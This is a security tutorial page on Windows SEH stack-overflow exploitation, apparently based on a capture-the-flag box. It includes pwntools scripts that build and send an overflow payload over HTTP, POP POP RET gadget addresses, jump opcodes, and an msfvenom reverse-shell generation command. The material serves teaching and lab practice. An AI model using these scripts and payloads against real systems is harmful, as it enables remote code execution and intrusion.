# Windows SEH Overflows

{{#include ../../banners/hacktricks-training.md}}

Structured Exception Handler (SEH) exploitation is a classic Windows-specific technique to gain control of execution when a stack buffer overflow overwrites the exception chain instead of the saved return address. This is common in 32-bit custom parsers/servers that copy attacker data into fixed-size stack buffers.

Key idea:
- When an access violation occurs, Windows walks the thread's SEH chain: [Next SEH (4B)] → [SEH handler (4B)] → ...
- If we overflow into these fields, we can place a short jump in Next SEH, and point SEH to a POP POP RET gadget in a module without SafeSEH/ASLR.
- Upon exception, the dispatcher executes POP POP RET, returning into our controlled bytes at Next SEH, which jumps back to a long jump that sends execution into our shellcode at the start of the buffer.

## Prerequisites and Protections
- Target is a 32-bit process with a stack-based overflow reaching the SEH records.
- Identify a module without SafeSEH and preferably without ASLR to host a reliable POP POP RET (PPR) gadget.
  - Commonly the main executable (.exe) is non-ASLR and compiled without SafeSEH.
- Typical bad chars in HTTP-based exploits: 00, 0a, 0d. Adjust per-protocol.
- DEP/NX: SEH does not bypass DEP by itself. In many CTF-like or legacy targets the stack is executable; otherwise prepare ROP/VirtualProtect/VirutalAlloc chains.

## Finding the Next SEH Offset
1) Trigger the crash sending a large payload and confirm the process restarts or is restartable.
2) Send a cyclic pattern as the overflow body, then note the values that land in Next SEH and SEH at crash time.

Using pwntools for a De Bruijn pattern:
```python
from pwn import *
pat = cyclic(2000)
# send pat as the overflowing body
# On crash, read Next SEH/SEH and find offsets:
off_nseh = cyclic_find(b"BBBB")  # example
off_seh  = off_nseh + 4
```

Or use x64dbg with ERC.Xdbg helpers to locate the Next SEH overwrite quickly.

Example observed in practice: Next SEH at offset 660 from the start of the buffer.

## Choosing a POP POP RET gadget
Find a POP POP RET in a module without SafeSEH/ASLR:
- In x64dbg with ERC.Xdbg: `ERC --SEH` and pick a PPR in a suitable module.
- In Immunity/Mona: `!mona modules` then `!mona seh` or `!mona ppr -m module.dll`.

Example: PPR in the main binary at 0x004094d8 (rainbow.exe, no ASLR/SafeSEH).

## Two-stage SEH Trampoline
Next SEH gives only 4 bytes. To jump far back into the buffer:
- Place a 5-byte long jmp just before Next SEH (E9 rel32)
- Put a 2-byte short jmp in Next SEH to hop backwards into the long jmp
- Put the PPR address in SEH

Useful opcodes (from nasm):
```
jmp -652        =>  E9 6F FD FF FF   # 5 bytes long jmp to the start of buffer
jmp short -8    =>  EB F6             # 2 bytes short jmp back into long jmp
```

## Layout
Let offset be where Next SEH starts (e.g., 660):
```
[ NOP sled + shellcode ] ... [ pad to (offset-8) ]
[ long jmp (5B) ] [ pad (3B) ]
[ Next SEH: short jmp (2B) + pad (2B) ]
[ SEH: PPR (4B) ]
[ trailing pad ]
```

Python builder (adapt to your offsets and gadget):
```python
from pwn import p32

offset = 660  # Next SEH
seh_ppr = 0x004094d8  # POP POP RET in non-ASLR, non-SafeSEH module

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp \
#   LHOST=<LHOST> LPORT=<LPORT> -b '\x00\x0a\x0d' -f python -v sc
sc = b""  # your shellcode here

buf  = b"\x90"*50 + sc
buf += b"A"*(offset-8 - len(buf))
# long jmp back into the shellcode region
buf += b"\xE9\x6F\xFD\xFF\xFF" + b"EEE"   # 5B long jmp + 3B pad
buf += b"\xEB\xF6" + b"BB"                   # Next SEH: short jmp -8 + pad
buf += p32(seh_ppr)                            # SEH: PPR
buf += b"D"*(1500 - len(buf))                  # pad to desired length
```

## Minimal crash and full HTTP delivery
Stage 1 – prove crash and measure:
```python
from pwn import remote
import sys

body = b"A"*1000
req = (f"POST / HTTP/1.1\r\nHost: {sys.argv[1]}:{sys.argv[2]}\r\n"
       f"User-Agent: curl\r\nAccept: */*\r\nContent-Length: {len(body)}\r\n"
       f"Connection: keep-alive\r\n\r\n").encode() + body
p = remote(sys.argv[1], int(sys.argv[2]))
p.send(req)
p.close()
```

Stage 2 – send SEH trampoline + shellcode:
```python
from pwn import remote
import sys

# build 'buf' as in layout above
body = buf
req = (f"POST / HTTP/1.1\r\nHost: {sys.argv[1]}:{sys.argv[2]}\r\n"
       f"User-Agent: curl\r\nAccept: */*\r\nContent-Length: {len(body)}\r\n"
       f"Connection: keep-alive\r\n\r\n").encode() + body
p = remote(sys.argv[1], int(sys.argv[2]))
p.send(req)
p.close()
```

Notes:
- Always set an accurate Content-Length so the server reads the entire body into the vulnerable buffer.
- Avoid bad chars present in the protocol or parser. For HTTP bodies, avoiding 00, 0A, 0D is often sufficient.
- If only SafeSEH modules are present, a classic SEH PPR redirection will fail. Look for a non-SafeSEH module (often the main .exe), or pivot to a DEP/ROP strategy.

## Troubleshooting
- Crash but no SEH overwrite: your body may be too small or the overflow is elsewhere (e.g., header parsing). Increase size or fuzz other inputs.
- PPR contains badchars: choose another PPR in a different module or adjust target.
- Jump distances wrong: recompute using a real assembler (nasm/ndisasm/keystone) and verify offsets in the debugger.

## Tools
- x64dbg/x32dbg for interactive debugging
- ERC.Xdbg to enumerate SEH gadgets quickly in x64dbg
- nasmshell for quick opcode assembly
- pwntools for transport
- msfvenom to generate shellcode respecting badchars

## References
- [HTB: Rainbow – 0xdf](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [x64dbg](https://x64dbg.com/)
- [ERC.Xdbg – SEH/gadget helper](https://github.com/Andy53/ERC.Xdbg)
- [nasmshell](https://github.com/fishstiqz/nasmshell)
- [pwntools](https://docs.pwntools.com/)
- [Metasploit msfvenom docs](https://docs.metasploit.com/)

{{#include ../../banners/hacktricks-training.md}}